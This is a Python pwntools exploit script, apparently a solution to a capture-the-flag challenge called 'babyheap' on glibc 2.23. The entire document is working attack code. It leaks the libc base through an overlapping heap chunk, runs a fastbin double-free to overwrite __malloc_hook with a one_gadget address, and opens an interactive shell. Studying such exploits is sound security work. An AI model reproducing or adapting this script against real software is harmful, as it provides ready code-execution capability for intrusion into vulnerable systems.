#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

def alloc(size):
    p.sendlineafter(b'Command: ', b'1')
    p.sendlineafter(b'Size: ', str(size))

def fill(index, size, content):
    p.sendlineafter(b'Command: ', b'2')
    p.sendlineafter(b'Index: ', str(index))
    p.sendlineafter(b'Size: ', str(size))
    if len(content) == size:
        p.sendafter(b'Content: ', content)
    else:
        p.sendlineafter(b'Content: ', content)

def free(index):
    p.sendlineafter(b'Command: ', b'3')
    p.sendlineafter(b'Index: ', str(index))

def dump(index):
    p.sendlineafter(b'Command: ', b'4')
    p.sendlineafter(b'Index: ', str(index))

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

libc = ELF('./libc-2.23.so')
p = process('./babyheap')

# leak libc
s1 = 0x20
s2 = 0x60
s3 = 0x60
s4 = 0x20
alloc(s1) # 0 a
alloc(s2) # 1 b
alloc(s3) # 2 c
alloc(s4) # 3 d

payload = b'a' * s1
payload += p64(0) + p64(0xe1)
fill(0, s1 + 0x10, payload)

free(1)
alloc(s2) # 1 b
dump(2)

p.recvuntil(b'Content: \n')
libc.address = u64(p.recv(8)) - 0x3c4b78
log.info('libc.address: {:#x}'.format(libc.address))

# double free, fastbin attack
alloc(s2) # 4 c
alloc(s2) # 5 e

free(2)
free(5)
free(4)

alloc(s2) # 2 c
alloc(s2) # 4 e
payload = p64(libc.symbols['__malloc_hook'] - 0x23)
fill(2, 0x8, payload)
alloc(s2) # 5 c
alloc(s2) # 6 (__malloc_hook - 0x13)

payload = b'a' * 0x13 + p64(libc.address + one_gadget[1])
fill(6, 0x13 + 0x8, payload)

alloc(s2) # Triger one-gadget

p.interactive()
